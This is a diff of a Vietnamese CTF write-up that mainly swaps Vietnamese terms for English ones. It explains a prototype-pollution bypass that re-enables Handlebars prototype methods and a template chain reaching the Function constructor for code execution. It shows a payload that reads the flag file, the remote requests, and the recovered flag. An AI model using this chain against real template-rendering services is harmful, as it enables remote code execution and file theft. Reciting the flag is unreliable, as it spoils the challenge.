@@ -19,7 +19,7 @@ language: "vi"
 
 Người chơi gửi JSON tới `/api/preview` với ba trường `template`, `theme`, `model`. `server.js` kiểm request rồi spawn một tiến trình Node mới chạy `src/worker.js` cho mỗi lượt in.
 
-Hai placeholder cần loại trừ ngay từ đầu: `flag.txt` trong handout (17 B) chứa `FortID{redacted}`, là giá trị mẫu mà `entrypoint` thay bằng `FLAG`; và `server.js:203` có `const flag = process.env.FLAG || "FortID{development_flag}";` — `FortID{development_flag}` là default khi chạy dev, không phải cờ.
+Hai placeholder cần loại trừ ngay từ đầu: `flag.txt` trong handout (17 B) chứa `FortID{redacted}`, là giá trị mẫu mà `entrypoint` thay bằng `FLAG`; và `server.js:203` có `const flag = process.env.FLAG || "FortID{development_flag}";` — `FortID{development_flag}` là default khi chạy dev, không phải flag.
 
 ## Phân tích
 
@@ -60,9 +60,9 @@ Với `theme = {"constructor":{"prototype":{"allowedProtoMethods":{...}}}}`:
 - Tương tự `Object["prototype"]` đã tồn tại, nên đệ quy lần hai đi vào `Object.prototype`.
 - Phép gán cuối cùng đặt `Object.prototype.allowedProtoMethods` thành `{constructor: true, apply: true, call: true}`.
 
-Server chỉ chặn đúng key `__proto__`; chuỗi `constructor` → `prototype` tới được cùng một đối tượng.
+Server chỉ chặn đúng key `__proto__`; chuỗi `constructor` → `prototype` tới được cùng một object.
 
-**Vì sao nó bật lại cổng Handlebars.** Handlebars dựng bảng trắng method từ chính options object:
+**Vì sao nó bật lại cổng Handlebars.** Handlebars dựng allowlist method từ chính options object:
 
 ```js
 methods: {
@@ -73,9 +73,9 @@ methods: {
 
 `createProtoAccessControl(runtimeOptions)` (`lib/handlebars/internal/proto-access.js`) đọc `runtimeOptions.allowedProtoMethods` — một key mà `worker.js` **không** set. Sau bước ô nhiễm, phép đọc đó rơi xuống `Object.prototype.allowedProtoMethods` và trả về object vừa được nhồi. `createNewLookupObject` merge nó vào `defaultMethodWhiteList` (vốn set `constructor: false`), nên `constructor`, `apply`, `call` trở thành method hợp lệ với `whitelist[name] === true`.
 
-Tóm lại: `allowProtoMethodsByDefault: false` vẫn còn đó, nhưng bảng trắng per-method đã bị người chơi cung cấp.
+Tóm lại: `allowProtoMethodsByDefault: false` vẫn còn đó, nhưng allowlist per-method đã bị người chơi cung cấp.
 
-**Chuỗi primitive.** Với bảng trắng đã bật, ba bước trong template (`OB`/`CB` ở dưới là hai ký tự mở/đóng của Handlebars, viết kiểu escape để bài này không chứa delimiter thô):
+**Chuỗi primitive.** Với allowlist đã bật, ba bước trong template (`OB`/`CB` ở dưới là hai ký tự mở/đóng của Handlebars, viết kiểu escape để bài này không chứa delimiter thô):
 
 ```text
 OBsetLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")CB
@@ -83,7 +83,7 @@ OB#each @root.oCBsetLayoutOption @root.o2 key="title" value=(apply "" @root.c1)C
 OB#each @root.o2CB{apply "" @root.c2}CBOB/eachCB
 ```
 
-- `lookup "a" "constructor"` cho `String`; `lookup String "constructor"` cho `Function`. Giá trị này được `setLayoutOption` (`worker.js:33-46`) ghi vào `@root.o.title` — helper cho ghi ba key `title`/`accent`/`caption` lên object `target`, nên đây là kênh lưu đối tượng.
+- `lookup "a" "constructor"` cho `String`; `lookup String "constructor"` cho `Function`. Giá trị này được `setLayoutOption` (`worker.js:33-46`) ghi vào `@root.o.title` — helper cho ghi ba key `title`/`accent`/`caption` lên object `target`, nên đây là kênh lưu object.
 - `#each @root.o` duyệt giá trị own-property của `o`, tức context trong block chính là `Function`. Trong context đó `(apply "" @root.c1)` phân giải thành `Function.prototype.apply` gọi trên `Function` với `thisArg = ""` và argsArray `[CODE]` — tương đương `Function(CODE)`, tức biên dịch một hàm mới từ chuỗi `model.c1[0]`. Kết quả được ghi vào `@root.o2.title`.
 - Block `#each @root.o2` thứ hai có context là hàm vừa biên dịch; stache ba lớp cho `apply "" @root.c2` với `c2 = []` tương đương `fn.apply("", [])`, tức **gọi hàm**. Dạng stache ba lớp in giá trị trả về thô, không escape.
 
@@ -99,13 +99,13 @@ const WORKER_ARGUMENTS = [
 ];
 ```
 
-và `env` truyền `FLAG_PATH=/tmp/lika/flag.txt`. Worker được phép đọc `/challenge` và file cờ đã chỉ định, nên payload chỉ cần đọc file đó:
+và `env` truyền `FLAG_PATH=/tmp/lika/flag.txt`. Worker được phép đọc `/challenge` và file flag đã chỉ định, nên payload chỉ cần đọc file đó:
 
 ```js
 return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')
 ```
 
-`process.mainModule.require` được dùng thay `require` vì thân hàm tạo bởi `new Function` không nằm trong module scope. `prepareFlag()` cũng `delete process.env.FLAG` (`server.js:205`), nên cờ chỉ còn trong file — không có đường tắt qua biến môi trường.
+`process.mainModule.require` được dùng thay `require` vì thân hàm tạo bởi `new Function` không nằm trong module scope. `prepareFlag()` cũng `delete process.env.FLAG` (`server.js:205`), nên flag chỉ còn trong file — không có đường tắt qua biến môi trường.
 
 ## Lời giải
 
@@ -146,7 +146,7 @@ validateJob: null
 OUTPUT: "FortID{local_test_flag_not_real}\n"
 ```
 
-`FortID{local_test_flag_not_real}` là nội dung `scratch/fakeflag.txt` do tự tay tạo để test đường đọc file; đây là placeholder cục bộ, không phải cờ. Chạy cục bộ gọi `render()` ngay trong process nên không có `--permission`; vì vậy phải tự trỏ `FLAG_PATH` tới một file cục bộ.
+`FortID{local_test_flag_not_real}` là nội dung `scratch/fakeflag.txt` do tự tay tạo để test đường đọc file; đây là placeholder cục bộ, không phải flag. Chạy cục bộ gọi `render()` ngay trong process nên không có `--permission`; vì vậy phải tự trỏ `FLAG_PATH` tới một file cục bộ.
 
 Client gửi lên instance thật, dùng đúng template đã kiểm chứng ở trên:
 
@@ -180,7 +180,7 @@ $ node remote.js "return 7*7"
 200 {"ok":true,"output":"49"}
 ```
 
-Đọc cờ:
+Đọc flag:
 
 ```console
 $ node remote.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')"
@@ -190,7 +190,7 @@ $ node remote.js "return process.mainModule.require('fs').readFileSync(process.e
 200 {"ok":true,"output":"FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}\n"}
 ```
 
-`\n` cuối là do `prepareFlag()` ghi `${flag}\n` (`server.js:204`), không phải một phần của cờ.
+`\n` cuối là do `prepareFlag()` ghi `${flag}\n` (`server.js:204`), không phải một phần của flag.
 
 ## Kết quả
 
@@ -198,11 +198,11 @@ $ node remote.js "return process.mainModule.require('fs').readFileSync(process.e
 FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}
 ```
 
-Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.
+Flag đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.
 
 ## Tái hiện
 
-Cần Node.js (đã kiểm trên v24), `unzip`, và dependency của handout (`express@4.21.2`, `handlebars@4.7.8`). Phần dựng payload chạy được hoàn toàn local; chỉ hai request `7*7` và đọc cờ cần instance đang sống.
+Cần Node.js (đã kiểm trên v24), `unzip`, và dependency của handout (`express@4.21.2`, `handlebars@4.7.8`). Phần dựng payload chạy được hoàn toàn local; chỉ hai request `7*7` và đọc flag cần instance đang sống.
 
 ```console
 $ mkdir -p lika-work/scratch
@@ -210,7 +210,7 @@ $ unzip handout.zip -d lika-work/handout
 $ cd lika-work/handout/do_you_know_lika && npm ci --omit=dev && cd ../../..
 ```
 
-`handout.zip` giải nén ra thư mục `do_you_know_lika/`, nên `unzip -d lika-work/handout` tạo đúng layout `lika-work/handout/do_you_know_lika/src/...`. Lưu block JS thứ nhất thành `lika-work/scratch/stage.js` và block thứ hai thành `lika-work/scratch/remote.js`; hai đường dẫn `require` trong `stage.js` đã trỏ sẵn tới `../handout/do_you_know_lika/src/...`. Tạo file test và chạy:
+`handout.zip` giải nén ra directory `do_you_know_lika/`, nên `unzip -d lika-work/handout` tạo đúng layout `lika-work/handout/do_you_know_lika/src/...`. Lưu block JS thứ nhất thành `lika-work/scratch/stage.js` và block thứ hai thành `lika-work/scratch/remote.js`; hai path `require` trong `stage.js` đã trỏ sẵn tới `../handout/do_you_know_lika/src/...`. Tạo file test và chạy:
 
 ```console
 $ printf 'FortID{local_test_flag_not_real}\n' > fakeflag.txt
